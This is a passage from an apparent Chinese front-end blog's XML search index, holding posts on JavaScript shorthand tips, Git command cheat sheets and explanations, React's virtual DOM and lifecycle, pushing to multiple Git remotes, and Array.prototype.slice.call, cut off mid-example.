first: &#123; required:true &#125;, last: &#123; required:true &#125;&#125; // universal validation functionconst validate = (schema, values) =&gt; &#123; for(field in schema) &#123; if(schema[field].required) &#123; if(!values[field]) &#123; return false; &#125; &#125; &#125; return true;&#125;console.log(validate(schema, &#123;first:'Bruce'&#125;)); // falseconsole.log(validate(schema, &#123;first:'Bruce',last:'Wayne'&#125;)); // true现在有了这个验证函数，我们就可以在所有窗体中重用，而无需为每个窗体编写自定义验证函数。13、双位操作符位操作符是 JavaScript 初级教程的基本知识点，但是我们却不常使用位操作符。因为在不处理二进制的情况下，没有人愿意使用 1 和 0。但是双位操作符却有一个很实用的案例。你可以使用双位操作符来替代 Math.floor( )。双否定位操作符的优势在于它执行相同的操作运行速度更快。1Math.floor(4.9) === 4 //true简写为：1~~4.9 === 4 //true]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>ES5开发技巧</tag>
        <tag>ES6开发技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git常用命令速查表]]></title>
    <url>%2F2017%2F10%2F09%2FGit%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[本文将对Git 命令，做一下全面而系统的简短总结，整理成简洁、明了的图表结构，方便查询一、 Git 常用命令速查git branch 查看本地所有分支git status 查看当前状态git commit 提交git branch -a 查看所有的分支git branch -r 查看远程所有分支git commit -am “init” 提交并且加注释git remote add origingit@192.168.1.119:ndshowgit push origin master 将文件给推到服务器上git remote show origin 显示远程库origin里的资源git push origin master:developgit push origin master:hb-dev 将本地库与服务器上的库进行关联git checkout –track origin/dev 切换到远程dev分支git branch -D master develop 删除本地库developgit checkout -b dev 建立一个新的本地分支devgit merge origin/dev 将分支dev与当前分支进行合并git checkout dev 切换到本地dev分支git remote show 查看远程库git add .git rm 文件名(包括路径) 从git中删除指定文件git clone git://github.com/schacon/grit.git 从服务器上将代码给拉下来git config –list 看所有用户git ls-files 看已经被提交的git rm [file name] 删除一个文件git commit -a 提交当前repos的所有的改变git add [file name] 添加一个文件到git indexgit commit -v 当你用－v参数的时候可以看commit的差异git commit -m “This is the messagedescribing the commit” 添加commit信息git commit -a -a是代表add，把所有的change加到git index里然后再commitgit commit -a -v 一般提交命令git log 看你commit的日志git diff 查看尚未暂存的更新git rm a.a 移除文件(从暂存区和工作区中删除)git rm –cached a.a 移除文件(只从暂存区中删除)git commit -m “remove” 移除文件(从Git中删除)git rm -f a.a 强行移除修改后文件(从暂存区和工作区中删除)git diff –cached 或 $ git diff –staged 查看尚未提交的更新git stash push 将文件给push到一个临时空间中git stash pop 将文件从临时空间pop下来git remote add origingit@github.com:username/Hello-World.gitgit push origin master 将本地项目给提交到服务器中git pull 本地与服务器端同步git push (远程仓库名) (分支名) 将本地分支推送到服务器上去。git push origin serverfix:awesomebranchgit fetch 相当于是从远程获取最新版本到本地，不会自动mergegit commit -a -m “log_message” (-a是提交所有改动，-m是加入log信息) 本地修改同步至服务器端 ：git branch branch_0.1 master 从主分支master创建branch_0.1分支git branch -m branch_0.1 branch_1.0 将branch_0.1重命名为branch_1.0git checkout branch_1.0/master 切换到branch_1.0/master分支git branch 删除远程branchgit push origin :branch_remote_namegit branch -r -d branch_remote_name初始化版本库，并提交到远程服务器端mkdir WebAppcd WebAppgit init 本地初始化touch READMEgit add README 添加文件git commit -m ‘first commit’git remote add origin git@github.com:daixu/WebApp.git 增加一个远程服务器端上面的命令会增加URL地址为’git@github.com:daixu/WebApp.git’，名称为origin的远程服务器库，以后提交代码的时候只需要使用 origin别名即可二、 Git 命令速查表1、常用的Git命令命令简要说明git add添加至暂存区git add–interactive交互式添加git apply应用补丁git am应用邮件格式补丁git annotate同义词，等同于git blamegit archive文件归档打包git bisect二分查找git blame文件逐行追溯git branch分支管理git cat-file版本库对象研究工具git checkout检出到工作区、切换或创建分支git cherry-pick提交拣选git citool图形化提交，相当于git gui&nbsp;命令git clean清除工作区未跟踪文件git clone克隆版本库git commit提交git config查询和修改配置git describe通过里程碑直观地显示提交IDgit diff差异比较git difftool调用图形化差异比较工具git fetch获取远程版本库的提交git format-patch创建邮件格式的补丁文件。参见git am&nbsp;命令git grep文件内容搜索定位工具git gui基于Tcl/Tk的图形化工具，侧重提交等操作git help帮助git init版本库初始化git init-db同义词，等同于git initgit log显示提交日志git merge分支合并git mergetool图形化冲突解决git mv重命名git pull拉回远程版本库的提交git push推送至远程版本库git rebase分支变基git rebase–interactive交互式分支变基git reflog分支等引用变更记录管理git remote远程版本库管理git repo-config同义词，等同于git configgit reset重置改变分支“游标”指向git rev-parse将各种引用表示法转换为哈希值等git revert反转提交git rm删除文件git show显示各种类型的对象git stage*同义词，等同于git addgit stash保存和恢复进度git status显示工作区文件状态git tag里程碑管理2、对象库操作相关命令命令简要说明git commit-tree从树对象创建提交git hash-object从标准输入或文件计算哈希值或创建对象git ls-files显示工作区和暂存区文件git ls-tree显示树对象包含的文件git mktag读取标准输入创建一个里程碑对象git mktree读取标准输入创建一个树对象git read-tree读取树对象到暂存区git update-index工作区内容注册到暂存区及暂存区管理git unpack-file创建临时文件包含指定blob&nbsp;的内容git write-tree从暂存区创建一个树对象3、引用操作相关命令命令简要说明git check-ref-format检查引用名称是否符合规范git for-each-ref引用迭代器，用于shell编程git ls-remote显示远程版本库的引用git name-rev将提交ID显示为友好名称git peek-remote*过时命令，请使用git ls-remotegit rev-list显示版本范围git show-branch显示分支列表及拓扑关系git show-ref显示本地引用git symbolic-ref显示或者设置符号引用git update-ref更新引用的指向git verify-tag校验GPG&nbsp;签名的Tag4、版本库管理相关命令命令简要说明git count-objects显示松散对象的数量和磁盘占用git filter-branch版本库重构git fsck对象库完整性检查git fsck-objects同义词，等同于git fsckgit gc版本库存储优化git index-pack从打包文件创建对应的索引文件git lost-found过时，请使用git fsck–lost-found&nbsp;命令git pack-objects从标准输入读入对象ID，打包到文件git pack-redundant查找多余的pack&nbsp;文件git pack-refs将引用打包到.git/packed-refs&nbsp;文件中git prune从对象库删除过期对象git prune-packed将已经打包的松散对象删除git relink为本地版本库中相同的对象建立硬连接git repack将版本库未打包的松散对象打包git show-index读取包的索引文件，显示打包文件中的内容git unpack-objects从打包文件释放文件git verify-pack校验对象库打包文件5、数据传输相关命令命令简要说明git fetch-pack执行git fetch&nbsp;或git pull命令时在本地执行此命令，用于从其他版本库获取缺失的对象git receive-pack执行git push&nbsp;命令时在远程执行的命令，用于接受推送的数据git send-pack执行git push&nbsp;命令时在本地执行的命令，用于向其他版本库推送数据git upload-archive执行git archive–remote&nbsp;命令基于远程版本库创建归档时，远程版本库执行此命令传送归档git upload-pack执行git fetch&nbsp;或git pull命令时在远程执行此命令，将对象打包、上传6、邮件相关命令命令简要说明git imap-send将补丁通过IMAP&nbsp;发送git mailinfo从邮件导出提交说明和补丁git mailsplit将mbox&nbsp;或Maildir格式邮箱中邮件逐一提取为文件git request-pull创建包含提交间差异和执行PULL操作地址的信息git send-email发送邮件7、协议相关命令命令简要说明git daemon实现Git协议git http-backend实现HTTP协议的CGI程序，支持智能HTTP协议git instaweb即时启动浏览器通过gitweb&nbsp;浏览当前版本库git shell受限制的shell，提供仅执行Git命令的SSH访问git update-server-info更新哑协议需要的辅助文件git http-fetch通过HTTP协议获取版本库git http-push通过HTTP/DAV协议推送git remote-ext由Git命令调用，通过外部命令提供扩展协议支持git remote-fd由Git命令调用，使用文件描述符作为协议接口git remote-ftp由Git命令调用，提供对FTP协议的支持git remote-ftps由Git命令调用，提供对FTPS协议的支持git remote-http由Git命令调用，提供对HTTP协议的支持git remote-https由Git命令调用，提供对HTTPS协议的支持git remote-testgit协议扩展示例脚本8、版本库转换和交互相关命令命令简要说明git archimport导入Arch版本库到Gitgit bundle提交打包和解包，以便在不同版本库间传递git cvsexportcommit将Git的一个提交作为一个CVS检出git cvsimport导入CVS版本库到Git。或者使用cvs2gitgit cvsserverGit的CVS协议模拟器，可供CVS命令访问Git版本库git fast-export将提交导出为git-fast-import&nbsp;格式git fast-import其他版本库迁移至Git的通用工具git svnGit&nbsp;作为前端操作Subversion9、合并相关的辅助命令命令简要说明git merge-base供其他脚本调用，找到两个或多个提交最近的共同祖先git merge-file针对文件的两个不同版本执行三向文件合并git merge-index对index中的冲突文件调用指定的冲突解决工具git merge-octopus合并两个以上分支。参见git merge&nbsp;的octopus合并策略git merge-one-file由git merge-index&nbsp;调用的标准辅助程序git merge-ours合并使用本地版本，抛弃他人版本。参见git merge&nbsp;的ours合并策略git merge-recursive针对两个分支的三向合并。参见git merge&nbsp;的recursive合并策略git merge-resolve针对两个分支的三向合并。参见git merge&nbsp;的resolve合并策略git merge-subtree子树合并。参见git merge&nbsp;的subtree合并策略git merge-tree显式三向合并结果，不改变暂存区git fmt-merge-msg供执行合并操作的脚本调用，用于创建一个合并提交说明git rerere重用所记录的冲突解决方案10、 杂项命令简要说明git bisect–helper由git bisect&nbsp;命令调用，确认二分查找进度git check-attr显示某个文件是否设置了某个属性git checkout-index从暂存区拷贝文件至工作区git cherry查找没有合并到上游的提交git diff-files比较暂存区和工作区，相当于git diff–rawgit diff-index比较暂存区和版本库，相当于git diff–cached–rawgit diff-tree比较两个树对象，相当于git diff–raw A Bgit difftool–helper由git difftool&nbsp;命令调用，默认要使用的差异比较工具git get-tar-commit-id从git archive&nbsp;创建的tar包中提取提交IDgit gui–askpass命令git gui&nbsp;的获取用户口令输入界面git notes提交评论管理git patch-id补丁过滤行号和空白字符后生成补丁唯一IDgit quiltimport将Quilt补丁列表应用到当前分支git replace提交替换git shortlog对git log&nbsp;的汇总输出，适合于产品发布说明git stripspace删除空行，供其他脚本调用git submodule子模组管理git tar-tree过时命令，请使用git archivegit var显示Git&nbsp;环境变量git web–browse启动浏览器以查看目录或文件git whatchanged显示提交历史及每次提交的改动git-mergetool–lib包含于其他脚本中，提供合并/差异比较工具的选择和执行git-parse-remote包含于其他脚本中，提供操作远程版本库的函数git-sh-setup包含于其他脚本中，提供shell&nbsp;编程的函数库]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Git常用命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git常用命令详解]]></title>
    <url>%2F2017%2F09%2F12%2FGit%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[一、 Git 命令初识在正式介绍Git命令之前，先介绍一下Git 的基本命令和操作，对Git命令有一个总体的认识示例：从Git 版本库的初始化，通常有两种方式：1）git clone：这是一种较为简单的初始化方式，当你已经有一个远程的Git版本库，只需要在本地克隆一份例如：git clone git://github.com/someone/some_project.git some_project上面的命令就是将’git://github.com/someone/some_project.git’这个URL地址的远程版本库，完全克隆到本地some_project目录下2）git init 和 git remote：这种方式稍微复杂一些，当你本地创建了一个工作目录，你可以进入这个目录，使用’git init’命令进行初始化；Git以后就会对该目录下的文件进行版本控制，这时候如果你需要将它放到远程服务器上，可以在远程服务器上创建一个目录，并把可访问的URL记录下来，此时你就可以利用’git remote add’命令来增加一个远程服务器端，例如：git remote add origin git://github.com/someone/another_project.git上面的命令就会增加URL地址为’git: //github.com/someone/another_project.git’，名称为origin的远程服务器，以后提交代码的时候只需要使用 origin别名即可二、 Git 常用命令1) 远程仓库相关命令检出仓库： $ git clone git://github.com/jquery/jquery.git查看远程仓库：$ git remote -v添加远程仓库：$ git remote add [name] [url]删除远程仓库：$ git remote rm [name]修改远程仓库：$ git remote set-url –push [name] [newUrl]拉取远程仓库：$ git pull [remoteName] [localBranchName]推送远程仓库：$ git push [remoteName] [localBranchName]如果想把本地的某个分支test提交到远程仓库，并作为远程仓库的master分支，或者作为另外一个名叫test的分支，如下：$git push origin test:master // 提交本地test分支作为远程的master分支$git push origin test:test // 提交本地test分支作为远程的test分支2）分支(branch)操作相关命令查看本地分支：$ git branch查看远程分支：$ git branch -r创建本地分支：$ git branch [name] —-注意新分支创建后不会自动切换为当前分支切换分支：$ git checkout [name]创建新分支并立即切换到新分支：$ git checkout -b [name]删除分支：$ git branch -d [name] —- -d选项只能删除已经参与了合并的分支，对于未有合并的分支是无法删除的。如果想强制删除一个分支，可以使用-D选项合并分支：$ git merge [name] —-将名称为[name]的分支与当前分支合并创建远程分支(本地分支push到远程)：$ git push origin [name]删除远程分支：$ git push origin :heads/[name] 或 $ gitpush origin :[name]*创建空的分支：(执行命令之前记得先提交你当前分支的修改，否则会被强制删干净没得后悔)$git symbolic-ref HEAD refs/heads/[name]$rm .git/index$git clean -fdx3）版本(tag)操作相关命令查看版本：$ git tag创建版本：$ git tag [name]删除版本：$ git tag -d [name]查看远程版本：$ git tag -r创建远程版本(本地版本push到远程)：$ git push origin [name]删除远程版本：$ git push origin :refs/tags/[name]合并远程仓库的tag到本地：$ git pull origin –tags上传本地tag到远程仓库：$ git push origin –tags创建带注释的tag：$ git tag -a [name] -m ‘yourMessage’4)子模块(submodule)相关操作命令添加子模块：$ git submodule add [url] [path]如：$git submodule add git://github.com/soberh/ui-libs.git src/main/webapp/ui-libs初始化子模块：$ git submodule init —-只在首次检出仓库时运行一次就行更新子模块：$ git submodule update —-每次更新或切换分支后都需要运行一下删除子模块：（分4步走哦）1)$ git rm –cached [path]2)编辑“.gitmodules”文件，将子模块的相关配置节点删除掉3)编辑“ .git/config”文件，将子模块的相关配置节点删除掉4)手动删除子模块残留的目录5)忽略一些文件、文件夹不提交在仓库根目录下创建名称为“.gitignore”的文件，写入不需要的文件夹名或文件，每个元素占一行即可，如targetbin*.db三、 Git 命令详解现在我们有了本地和远程的版本库，让我们来试着用用Git的基本命令：git pull：从其他的版本库（既可以是远程的也可以是本地的）将代码更新到本地，例如：’git pull origin master’就是将origin这个版本库的代码更新到本地的master主枝，该功能类似于SVN的updategit add：是将当前更改或者新增的文件加入到Git的索引中，加入到Git的索引中就表示记入了版本历史中，这也是提交之前所需要执行的一步，例如’git add app/model/user.rb’就会增加app/model/user.rb文件到Git的索引中，该功能类似于SVN的addgit rm：从当前的工作空间中和索引中删除文件，例如’git rm app/model/user.rb’，该功能类似于SVN的rm、delgit commit：提交当前工作空间的修改内容，类似于SVN的commit命令，例如’git commit -m story #3, add user model’，提交的时候必须用-m来输入一条提交信息，该功能类似于SVN的commitgit push：将本地commit的代码更新到远程版本库中，例如’git push origin’就会将本地的代码更新到名为orgin的远程版本库中git log：查看历史日志，该功能类似于SVN的loggit revert：还原一个版本的修改，必须提供一个具体的Git版本号，例如’git revert bbaf6fb5060b4875b18ff9ff637ce118256d6f20’，Git的版本号都是生成的一个哈希值上面的命令几乎都是每个版本控制工具所公有的，下面就开始尝试一下Git独有的一些命令：git branch：对分支的增、删、查等操作，例如’git branch new_branch’会从当前的工作版本创建一个叫做new_branch的新分支，’git branch -D new_branch’就会强制删除叫做new_branch的分支，’git branch’就会列出本地所有的分支git checkout：Git的checkout有两个作用，其一是在不同的branch之间进行切换，例如’git checkout new_branch’就会切换到new_branch的分支上去；另一个功能是还原代码的作用，例如’git checkout app/model/user.rb’就会将user.rb文件从上一个已提交的版本中更新回来，未提交的内容全部会回滚git rebase：用下面两幅图解释会比较清楚一些，rebase命令执行后，实际上是将分支点从C移到了G，这样分支也就具有了从C到G的功能git reset：将当前的工作目录完全回滚到指定的版本号，假设如下图，我们有A-G五次提交的版本，其中C的版本号是 bbaf6fb5060b4875b18ff9ff637ce118256d6f20，我们执行了’git reset bbaf6fb5060b4875b18ff9ff637ce118256d6f20’那么结果就只剩下了A-C三个提交的版本git stash：将当前未提交的工作存入Git工作栈中，时机成熟的时候再应用回来，这里暂时提一下这个命令的用法，后面在技巧篇会重点讲解git config：利用这个命令可以新增、更改Git的各种设置，例如’git config branch.master.remote origin’就将master的远程版本库设置为别名叫做origin版本库，后面在技巧篇会利用这个命令个性化设置你的Git，为你打造独一无二的 Gitgit tag：可以将某个具体的版本打上一个标签，这样你就不需要记忆复杂的版本号哈希值了，例如你可以使用’git tag revert_version bbaf6fb5060b4875b18ff9ff637ce118256d6f20’来标记这个被你还原的版本，那么以后你想查看该版本时，就可以使用 revert_version标签名，而不是哈希值了Git 之所以能够提供方便的本地分支等特性，是与它的文件存储机制有关的。Git存储版本控制信息时使用它自己定义的一套文件系统存储机制，在代码根目录下有一个.git文件夹，会有如下这样的目录结构：有几个比较重要的文件和目录需要解释一下：HEAD文件存放根节点的信息，其实目录结构就表示一个树型结构，Git采用这种树形结构来存储版本信息，那么HEAD就表示根；refs目录存储了你在当前版本控制目录下的各种不同引用（引用指的是你本地和远程所用到的各个树分支的信息），它有heads、remotes、stash、tags四个子目录，分别存储对不同的根、远程版本库、Git栈和标签的四种引用，你可以通过命令’git show-ref’更清晰地查看引用信息；logs目录根据不同的引用存储了日志信息。因此，Git只需要代码根目录下的这一个.git目录就可以记录完整的版本控制信息，而不是像SVN那样根目录和子目录下都有.svn目录。那么下面就来看一下Git与SVN的区别吧四、 Git 与SVN 比较SVN（Subversion）是当前使用最多的版本控制工具。与它相比较，Git 最大的优势在于两点：易于本地增加分支和分布式的特性。下面两幅图可以形象的展示Git与SVN的不同之处：1）本地增加分支图中Git本地和服务器端结构都很灵活，所有版本都存储在一个目录中，你只需要进行分支的切换即可达到在某个分支工作的效果而SVN则完全不同，如果你需要在本地试验一些自己的代码，只能本地维护多个不同的拷贝，每个拷贝对应一个SVN服务器地址举一个实际的例子：使用SVN作为版本控制工具，当正在试图增强一个模块，工作做到一半，由于会改变原模块的行为导致代码服务器上许多测试的失败，所以并没有提交代码。这时候假如现在有一个很紧急的Bug需要处理， 必须在两个小时内完成。我只好将本地的所有修改diff，并输出成为一个patch文件，然后回滚有关当前任务的所有代码，再开始修改Bug的任务，等到修改好后，在将patch应用回来。前前后后要完成多个繁琐的步骤，这还不计中间代码发生冲突所要进行的工作量。可是如果使用Git， 我们只需要开一个分支或者转回到主分支上，就可以随时开始Bug修改的任务，完成之后，只要切换到原来的分支就可以优雅的继续以前的任务。只要你愿意，每一个新的任务都可以开一个分支，完成后，再将它合并到主分支上，轻松而优雅。2）分布式提交Git 可以本地提交代码，所以在上面的图中，Git有利于将一个大任务分解，进行本地的多次提交而SVN只能在本地进行大量的一次性更改，导致将来合并到主干上造成巨大的风险3）日志查看Git 的代码日志是在本地的，可以随时查看SVN的日志在服务器上的，每次查看日志需要先从服务器上下载下来例如：代码服务器在美国，当每次查看几年前所做的工作时，日志下载可能需要十分钟，这不能不说是一个痛苦。但是如果迁移到Git上，利用Git日志在本地的特性，查看某个具体任务的所有代码历史，每次只需要几秒钟，大大方便了工作，提高了效率。当然分布式并不是说用了Git就不需要一个代码中心服务器，如果你工作在一个团队里，还是需要一个服务器来保存所有的代码的。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Git常用命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Reactjs工作原理]]></title>
    <url>%2F2017%2F08%2F24%2F%E6%B5%85%E8%B0%88Reactjs%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;Reactjs 起源于Facebook内部项目，是一个用来构建用户界面的 javascript 库，相当于MVC架构中的V层框架，与市面上其他框架不同的是，React 把每一个组件当成了一个状态机，组件内部通过state来维护组件状态的变化，当组件的状态发生变化时，React通过虚拟DOM技术来增量并且高效的更新真实DOM。本文将对React 的这些特点进行简单的介绍。Hello React&emsp;&emsp;考虑到有的同学还不曾了解过React，我们先来写一个简单的React组件，让大家一睹为快！12345678910111213141516// 创建一个HelloReact组件class HelloReact extends React.Component&#123; render()&#123; return ( &lt;div&gt; Hello React! &lt;/div&gt; ) &#125;&#125; // 使用HelloReact组件ReactDOM.render( &lt;HelloReact /&gt;, document.querySelector('body'))&emsp;&emsp;这样就定义了一个React组件，当然要运行这段代码是有条件的，需要引入React库，还需要引入JSX语法转换库，这里不多说了，这些基础的东西还需要各位亲自实践才好！虚拟DOM（Virtual DOM）&emsp;&emsp;在前端开发的过程中，我们经常会做的一件事就是将变化的数据实时更新到UI上，这时就需要对DOM进行更新和重新渲染，而频繁的DOM操作通常是性能瓶颈产生的原因之一，有时候我们会遇到这样一种尴尬的情况：比如有一个列表数据，当用户执行刷新操作时，Ajax会重新从后台请求数据，即使新请求的数据和上次完全相同，DOM也会被全部更新一遍并进行重新渲染，这样就产生了不必要的性能开销。&emsp;&emsp;React为此引入了虚拟DOM（Virtual DOM）机制：对于每一个组件，React会在内存中构建一个相对应的DOM树，基于React开发时所有的DOM构造都是通过虚拟DOM进行，每当组件的状态发生变化时，React都会重新构建整个DOM数据，然后将当前的整个DOM树和上一次的DOM树进行对比，得出DOM结构变化的部分(Patchs)，然后将这些Patchs 再更新到真实DOM中。整个过程都是在内存中进行，因此是非常高效的。借用一张图可以清晰的表示虚拟DOM的工作机制：React 生命周期&emsp;&emsp;React 把每个组件都当作一个状态机来维护和管理，因此每个组件都拥有一套完整的生命周期，大致可以分为三个过程：初始化、更新和销毁。生命周期的每一个过程都明确的反映了组件的状态变化。对于开发来说就能很容易的把握组件的每个状态，不同的状态时期做对应的事情，互不干扰。以下是和组件生命周期相关的几个方法：123456789getDefaultProps //创建组建getInitialState //实例化状态componentWillMount //挂载前componentDidMount //挂载后componentWillReceiveProps //属性被改变时shouldComponentUpdate //是否更新componentWillUpdate //更新前componentDidUpdate //更新后componentWillUnmount //销毁前初始化&emsp;&emsp;对于外部系统来说，组件是一个独立存在的封闭系统，内部的逻辑被隐藏，只对外暴露传递数据的接口，而React为我们提供了两种方式来向组件传递数据，即 props 和 state。&emsp;&emsp;props 是在调用 ReactDOM.render() 时通过标签属性xxx传递，然后通过 this.props.xxx 来获取，getDefaultProps 允许你为组件设置一个默认的props值，在没有传递props的情况下显示默认值。123456789101112131415161718192021222324// 创建HelloReact组件class HelloReact extends React.Component&#123; /** * 当设置props的默认值 当没有传递时显示默认值 * @return &#123;&#125; */ getDefaultProps()&#123; return &#123; data:"暂无数据" &#125; &#125; render()&#123; return ( &lt;div&gt; //显示data，当props发生变化时会自动更新 &#123;this.props.data&#125; &lt;/div&gt; ) &#125;&#125;;//传递props属性dataReactDOM.render( &lt;HelloReact data=&#123;"Hello React!"&#125; /&gt;, document.querySelector('body'))&emsp;&emsp;和 props 不同的是，state不能通过外部传递，因此在使用state之前，需要在 getInitialState 中为state设置一个默认值，然后才能通过 this.state.xxx 来访问，当组件被挂载完成时，触发 componentDidMount 方法，我们可以在这里通过Ajax请求服务器数据，然后再通过 setState() 把state的值设置为真实数据。12345678910111213141516171819202122232425262728293031323334353637383940414243// 创建HelloReact组件class HelloReact extends React.Component&#123; /** * 设置组件的初始值 * @returns &#123;&#123;data: Array, msg: string&#125;&#125; */ getInitialState()&#123; return &#123; data:"数据加载中..." //初始值为[] &#125; &#125; /** * 挂载后首次加载数据 */ componentDidMount()&#123; this.requestData();//请求数据 &#125; /** * 请求后台数据 */ requestData()&#123; $.ajax(&#123; url:'xxxx.ashx', data:&#123;&#125;, success:function(data)&#123; this.setState(&#123; data:data //通过setState()更新服务器数据 &#125;) &#125; &#125;.bind(this)) &#125; render()&#123; return ( &lt;div&gt; &#123;this.state.data&#125; &lt;/div&gt; ) &#125;&#125;;ReactDOM.render( &lt;HelloReact /&gt;, document.querySelector('body'))更新&emsp;&emsp;props属性是只读的，如果想要改变props的值，只能通过重新调用render()来传递新的props，但要注意的是，重新执行render()组件不会被重新挂载，而是通过虚拟DOM技术进行增量更新和渲染，这时还会触发 componentWillReceiveProps 方法，并将新的props作为参数传递，你可以在这里对新的props进行处理。&emsp;&emsp;相比props，state天生就是用来反映组件状态的，因此它的值是可以被改变的，当state的值被改变时，通过setState就可以改变state的值，React同样也是采用虚拟DOM技术来计算需要被更新的部分，而不是牵一发动全身的更新和渲染。&emsp;&emsp;当 props 和 state 的状态发生变化后，组件在即将更新之前还会触发一个叫 shouldConponentUpdate 的方法，如果 shouldConponentUpdate 返回的是 true，不管props和state 的值和上一次相比有没有变化，React 都会老老实实的进行对比。此时，如果你确定以及肯定两次数据没有变化，那就让 shouldConponentUpdate 返回 false，React就不会进行diff了，更不会重新渲染了。瞬间省去了diff的时间。销毁&emsp;&emsp;当组件从DOM中被移除时，React会销毁之。在销毁之前，细心的React还触发 componentWillUnmount 来通知你，看你最后有没有什么话想对这个即将销毁的组件说，当然你没什么事就不用了。什么时候用props,什么时候用state&emsp;&emsp;我们已经知道可以通过props和state两种方式向组件传递数据，props是只读的不能被改变，而 state 是用来反映一个组件的状态，是可以改变的。因此，当组件所需要的数据在调用时是已经确定的，不频繁发生变化的，就可以使用props来传递，相反，当组件所需要的数据在调用时不能确定，需要等待异步回调时才能确定，比如ajax请求数据，input的onchange事件，这时就需要使用state来记录和改变这些值得变化。]]></content>
      <categories>
        <category>Reactjs</category>
      </categories>
      <tags>
        <tag>Reactjs</tag>
        <tag>Reactjs工作原理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git一键同步到多个不同代码库]]></title>
    <url>%2F2017%2F08%2F23%2FGit%E4%B8%80%E9%94%AE%E5%90%8C%E6%AD%A5%E5%88%B0%E5%A4%9A%E4%B8%AA%E4%B8%8D%E5%90%8C%E4%BB%A3%E7%A0%81%E5%BA%93%2F</url>
    <content type="text"><![CDATA[需求&emsp;&emsp;现在代码库众多，有京东、csdn.github、bitbucket,最早我的项目在bitbucket上，但是发现在家里电信网络慢的动都动不了，应该是被电信和谐了，所以不得不改用国内的，但也不想重新建个git，如果能够一键同步到多个不是更好？建立多个远程仓库&emsp;&emsp;比如在Github的地址是git@github.com:xxx/xxx.git，在Git@OSC的地址是git@git.oschina.net:yyyy/yyy.git。按照原先的思路，我们在建立远程库的时候都是运行1234git remote add origin git@github.com:xxx/xxx.gitgit add .git commit -m 'First commit'git push -u origin master&emsp;&emsp;Git@OSC类似，以前只是知道origin表示远程仓库的名字，不懂具体含义，后来才知道origin只是git@github.com:xxx/xxx.git的别名，于是这个名字便不再重要。这么解释的话，我们可以通过命令添加多个远程仓库，保证这个“别名”不重复既可。123456git remote add origin git@github.com:xxx/xxx.gitgit remote add osc git@git.oschina.net:yyyy/yyy.gitgit add .git commit -m 'First commit'git push -u origin mastergit push -u osc master&emsp;&emsp;运行几条命令，我们便可以把同一次提交提交到多个远程库，当然首次push到京东的时候会报冲突错误，这个时候push后面加–force可以搞定 为了方便，我创建了一个push.sh的脚本，内容是：12345#!/bin/bashecho 'Push to origin master'git push origin masterecho 'Push to osc master'git push osc master这样每次提交，我就可以只运行这个脚本就可以，十分方便。注：git push -u中的-u参数为第一次提交使用，作用是把本地的master分支和远程的master分支关联起来，简化命令，之后提交不需要这个参数。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>git使用两个库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈javascript的Array.prototype.slice.call]]></title>
    <url>%2F2017%2F07%2F14%2F%E6%B5%85%E8%B0%88javascript%E7%9A%84array-prototype-slice-call%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在js中我们经常会看到Array.prototype.slice.call(arguments,0)的写法，当然，这个方法的作用也许大家都明白，那就是把类数组对象转换成一个真正的数组。关于这个方法，我说说自己的理解。这里涉及到slice()方法和call()方法，所以先简单说说这两个方法。slice()方法&emsp;&emsp;数组和字符串都有这个slice方法，这个方法的作用是截取一段数据。它接收两个参数，第一个参数是要截取的位置索引，第二参数可选，表示要截取到的结束位置，但是不包括结束位置。在数组中，该方法的返回值是包含截取元素的组成的数组，在字符串中，该方法的返回值是包含截取字符串组成的字符串。&emsp;&emsp;该方法也可以传入负数值，当参数为负数的时候，将参数和数组或字符串的长度相加得到的正数作为实际的参数。如下：12[1,2,3,4,5,6].slice(2,4);[1,2,3,4,5,6].slice(-4,-2);返回值均为[3,4]，为数组。12'everything'.slice(2,4);'everything'.slice(-4,-2);返回值分别为’er’和’hi’，为字符串。&emsp;&emsp;如果之传入一个参数的话，那就是输出从开始位置到结束位置的所有元素。不再举例。字符串的其他类似方法在字符串中，和slice()方法类型的还有两个方法：substring()和substr()方法。&emsp;&emsp;其中，substring()方法表示返回从开始位置到结束位置的字符串，substr()接收两个参数，第一个参数表示开始位置，第二个参数表示要截取的字符个数，和前两个方法略有不同。当传入方法的参数为负数时，这三种方法又略有不同。当传入方法的参数为负数时：slice()像上面说的，是负数加上字符串的长度得出相应的正值；substring()方法的参数均置为零；substr()方法的第一个参数为负值加上字符串长度得到的正值，第二个参数置为零。call()和apply()方法call()和apply()方法主要是用来扩充函数的作用域。call()和apply()方法接收两个参数：apply()：第一个参数是作用域，第二个是参数数组，其中第二个参数可以是数组实例，也可以是arguments对象。call()方法也接收两个参数，仅仅在于和apply()的传参方式不同：传递函数的参数必须逐个写入。鉴于这里不是重点，在这里就不再赘述。1Array.prototype.slice.call(arguments,0)&emsp;&emsp;可能刚开始学习js的童鞋并不是很能理解这句为什么能实现这样的功能。比如我就是一个，所以，来探究一下。&emsp;&emsp;首先，slice有两个用法，一个是String.slice,一个是Array.slice，第一个返回的是字符串，第二个返回的是数组，这里我们看第2个。&emsp;&emsp;Array.prototype.slice.call(arguments)能够将arguments转成数组，那么就是arguments.toArray().slice();到这里，是不是就可以说Array.prototype.slice.call(arguments)的过程就是先将传入进来的第一个参数转为数组，再调用slice？再看call的用法，如下例子123456var a = function()&#123;console.log(this); // 'littledu'console.log(typeof this); // Objectconsole.log(this instanceof String); // 